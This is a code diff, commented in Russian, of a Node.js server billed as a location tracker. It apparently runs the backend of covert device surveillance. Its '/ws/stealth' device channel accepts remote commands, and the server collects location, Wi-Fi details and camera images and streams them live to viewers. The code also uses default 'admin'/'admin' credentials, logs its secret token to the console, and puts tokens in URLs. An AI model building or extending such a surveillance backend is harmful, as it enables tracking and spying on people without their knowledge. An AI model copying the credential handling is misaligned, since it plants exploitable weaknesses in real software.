@@ -8,6 +8,8 @@ import http from 'http';
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+console.log('Starting location tracker server...');
+
 // Создаем HTTP сервер
 const server = http.createServer(app);
 
@@ -19,6 +21,11 @@ const supabaseKey = process.env.SUPABASE_ANON_KEY;
 const ADMIN_USER = process.env.ADMIN_USER || "admin";
 const ADMIN_PASS = process.env.ADMIN_PASS || "admin";
 const SECRET_TOKEN = process.env.SECRET_TOKEN || "your_secret_key_123";
+
+console.log('Configuration:');
+console.log('- Supabase URL:', supabaseUrl);
+console.log('- Admin User:', ADMIN_USER);
+console.log('- Secret Token:', SECRET_TOKEN);
 
 // Проверка наличия ключей
 if (!supabaseUrl || !supabaseKey) {
@@ -34,21 +41,22 @@ app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static("public"));
 
 // === WebSocket Setup ===
-// Хранилище активных соединений
 const activeConnections = new Map();
 const webClients = new Set();
 
 // WebSocket для устройств
+console.log('Initializing device WebSocket server...');
 const wss = new WebSocketServer({ 
     server,
     path: '/ws/stealth'
 });
 
 wss.on('connection', (ws, req) => {
+    console.log('NEW DEVICE WebSocket connection:', req.url);
     const url = new URL(req.url, `http://${req.headers.host}`);
     const deviceId = url.pathname.split('/').pop();
     
-    console.log(`Device connection: ${deviceId}`);
+    console.log(`Device connected: ${deviceId}`);
     activeConnections.set(deviceId, ws);
     
     ws.on('message', (data) => {
@@ -68,20 +76,30 @@ wss.on('connection', (ws, req) => {
         activeConnections.delete(deviceId);
         console.log(`Device ${deviceId} disconnected`);
     });
+    
+    ws.on('error', (error) => {
+        console.error('Device WebSocket error:', error);
+    });
 });
 
 // WebSocket для веб-клиентов
+console.log('Initializing web client WebSocket server...');
 const webWss = new WebSocketServer({ 
     server,
     path: '/ws/live'
 });
 
 webWss.on('connection', (ws) => {
+    console.log('NEW WEB CLIENT WebSocket connection');
     webClients.add(ws);
-    console.log('Web client connected');
     
     ws.on('close', () => {
         webClients.delete(ws);
+        console.log('Web client disconnected');
+    });
+    
+    ws.on('error', (error) => {
+        console.error('Web client WebSocket error:', error);
     });
 });
 
@@ -91,9 +109,15 @@ function broadcastToWebClients(deviceId, message) {
         ...message
     });
     
+    console.log(`Broadcasting to ${webClients.size} web clients from device ${deviceId}`);
+    
     webClients.forEach(client => {
         if (client.readyState === 1) { // WebSocket.OPEN
-            client.send(data);
+            try {
+                client.send(data);
+            } catch (error) {
+                console.error('Error sending to web client:', error);
+            }
         }
     });
 }
@@ -134,19 +158,47 @@ app.post('/api/device/command', (req, res) => {
             timestamp: Date.now()
         }));
         
+        console.log(`Command sent to device ${device_id}: ${command}`);
         res.json({ success: true, command_sent: command });
     } else {
+        console.log(`Device ${device_id} not connected`);
         res.status(404).json({ error: "Device not connected" });
     }
 });
 
+// Прием изображений через HTTP (fallback)
+app.post('/api/camera/image', (req, res) => {
+    const authHeader = req.headers.authorization;
+    const receivedToken = authHeader && authHeader.split(' ')[1];
+    
+    if (receivedToken !== SECRET_TOKEN) {
+        console.log('Unauthorized image request:', authHeader);
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
+    
+    const { type, device_id, data, timestamp } = req.body;
+    
+    console.log(`Received ${type} from device ${device_id} via HTTP`);
+    
+    // Пересылаем всем веб-клиентам
+    broadcastToWebClients(device_id, { 
+        type, 
+        data, 
+        timestamp: timestamp || Date.now() 
+    });
+    
+    res.json({ success: true });
+});
+
 // Прием данных локации
 app.post("/api/location", async (req, res) => {
-    const receivedToken = req.headers.authorization;
-
+    const authHeader = req.headers.authorization;
+    const receivedToken = authHeader && authHeader.split(' ')[1];
+    
     if (receivedToken !== SECRET_TOKEN) {
-    return res.status(401).json({ error: 'Unauthorized' });
-}
+        console.log('Unauthorized location request:', authHeader);
+        return res.status(401).json({ error: 'Unauthorized' });
+    }
     
     const { device_id, device_name, latitude, longitude, timestamp, accuracy, battery, wifi_info } = req.body;
     
@@ -156,29 +208,31 @@ app.post("/api/location", async (req, res) => {
     }
     
     try {
-    const { error } = await supabase
-        .from('locations')
-        .insert([{
-            device_id,
-            device_name,
-            latitude: parseFloat(latitude),
-            longitude: parseFloat(longitude),
-            timestamp: typeof timestamp === 'string' ? new Date(timestamp).getTime() : timestamp, // <-- bigint
-            accuracy: parseFloat(accuracy),
-            battery: parseInt(battery),
-            wifi_info: wifi_info || null
-        }]);
+        const { error } = await supabase
+            .from('locations')
+            .insert([{
+                device_id,
+                device_name,
+                latitude: parseFloat(latitude),
+                longitude: parseFloat(longitude),
+                timestamp: new Date(timestamp).toISOString(), // Правильный формат для timestamp
+                accuracy: parseFloat(accuracy),
+                battery: parseInt(battery),
+                wifi_info: wifi_info || null
+            }]);
+            
+        if (error) {
+            console.error('Supabase error:', error);
+            return res.status(500).json({ error: 'Database error' });
+        }
         
-    if (error) {
-        console.error('Supabase error:', error);
-        return res.status(500).json({ error: 'Database error' });
+        console.log(`Location saved for device ${device_id}`);
+        res.json({ success: true });
+        
+    } catch (error) {
+        console.error('Location save error:', error);
+        res.status(500).json({ error: 'Server error' });
     }
-    
-    res.json({ success: true });
-} catch (error) {
-    console.error('Location save error:', error);
-    res.status(500).json({ error: 'Server error' });
-}
 });
 
 // Получение списка устройств
@@ -218,41 +272,20 @@ app.get("/api/devices/:token", async (req, res) => {
                     last_location: {
                         lat: location.latitude,
                         lng: location.longitude
-                    }
+                    },
+                    is_connected: activeConnections.has(location.device_id)
                 };
             }
             devices[location.device_id].location_count++;
         });
         
+        console.log(`Returned ${Object.keys(devices).length} devices`);
         res.json(Object.values(devices));
         
     } catch (error) {
         console.error('Database error:', error);
         res.status(500).json({ error: 'Database error' });
     }
-});
-
-// Добавьте этот эндпоинт для приема изображений через HTTP
-app.post('/api/camera/image', (req, res) => {
-    const authHeader = req.headers.authorization;
-    const receivedToken = authHeader && authHeader.split(' ')[1];
-    
-    if (receivedToken !== SECRET_TOKEN) {
-        return res.status(401).json({ error: 'Unauthorized' });
-    }
-    
-    const { type, device_id, data, timestamp } = req.body;
-    
-    console.log(`Received ${type} from device ${device_id}`);
-    
-    // Пересылаем всем веб-клиентам
-    broadcastToWebClients(device_id, { 
-        type, 
-        data, 
-        timestamp: timestamp || Date.now() 
-    });
-    
-    res.json({ success: true });
 });
 
 // Получение данных конкретного устройства
@@ -284,7 +317,8 @@ app.get("/api/device/:deviceId/:token", async (req, res) => {
             device_id: deviceId,
             device_name: device?.device_name || 'Unknown Device',
             locations: filteredLocations,
-            total_points: data.length
+            total_points: data.length,
+            is_connected: activeConnections.has(deviceId)
         });
         
     } catch (error) {
@@ -293,8 +327,7 @@ app.get("/api/device/:deviceId/:token", async (req, res) => {
     }
 });
 
-// Analytics
-// Замените метод analytics:
+// Analytics (упрощенная версия)
 app.get("/api/analytics/:device_id/:token", async (req, res) => {
     const { device_id, token } = req.params;
     
@@ -303,89 +336,28 @@ app.get("/api/analytics/:device_id/:token", async (req, res) => {
     }
     
     const days = parseInt(req.query.days) || 7;
-    const startDate = new Date(Date.now() - days * 24 * 60 * 60 * 1000);
 
     try {
         const { data: locations, error } = await supabase
             .from("locations")
-            .select("*")
+            .select("device_id, device_name, latitude, longitude, timestamp, battery")
             .eq("device_id", device_id)
-            .gte("created_at", startDate.toISOString()) // Используем created_at вместо timestamp
-            .order("created_at", { ascending: true });
+            .order("timestamp", { ascending: true })
+            .limit(500);
 
         if (error) throw error;
 
-        // Простая статистика без сложных вычислений
         res.json({
             device_id,
+            device_name: locations[0]?.device_name || 'Unknown Device',
             period_days: days,
             total_points: locations.length,
-            locations: locations.slice(-100) // Последние 100 точек
+            locations: locations.slice(-100)
         });
         
     } catch (error) {
         console.error('Analytics error:', error);
         res.status(500).json({ error: 'Analytics error' });
-    }
-});
-
-// Rename device
-app.post("/api/device/:device_id/rename", async (req, res) => {
-    const { token, name } = req.body;
-    
-    if (token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: "Forbidden" });
-    }
-
-    try {
-        const { error } = await supabase
-            .from("locations")
-            .update({ device_name: name })
-            .eq("device_id", req.params.device_id);
-
-        if (error) throw error;
-        res.json({ success: true });
-        
-    } catch (error) {
-        res.status(500).json({ error: error.message });
-    }
-});
-
-// Delete device
-app.delete("/api/device/:device_id/:token", async (req, res) => {
-    if (req.params.token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: "Forbidden" });
-    }
-
-    try {
-        await supabase.from("locations").delete().eq("device_id", req.params.device_id);
-        res.json({ success: true });
-    } catch (error) {
-        res.status(500).json({ error: error.message });
-    }
-});
-
-// Export data
-app.get("/api/export/:device_id/:token", async (req, res) => {
-    if (req.params.token !== SECRET_TOKEN) {
-        return res.status(403).json({ error: "Forbidden" });
-    }
-
-    try {
-        const { data: locations } = await supabase
-            .from("locations")
-            .select("*")
-            .eq("device_id", req.params.device_id)
-            .order("timestamp", { ascending: true });
-
-        res.json({
-            device_id: req.params.device_id,
-            device_name: locations[0]?.device_name || 'Unknown Device',
-            locations
-        });
-        
-    } catch (error) {
-        res.status(500).json({ error: error.message });
     }
 });
 
@@ -445,8 +417,22 @@ function getDistance(lat1, lon1, lat2, lon2) {
 // Запуск сервера
 server.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
+    console.log('WebSocket servers initialized:');
+    console.log('- Device WebSocket: /ws/stealth');
+    console.log('- Web Client WebSocket: /ws/live');
+    console.log('Available endpoints:');
+    console.log('- POST /api/login');
+    console.log('- POST /api/location');
+    console.log('- POST /api/camera/image');
+    console.log('- GET /api/devices/:token');
+    console.log('Server ready for connections!');
 });
 
+// Обработка ошибок WebSocket сервера
+wss.on('error', (error) => {
+    console.error('Device WebSocket Server error:', error);
+});
 
-
-
+webWss.on('error', (error) => {
+    console.error('Web Client WebSocket Server error:', error);
+});
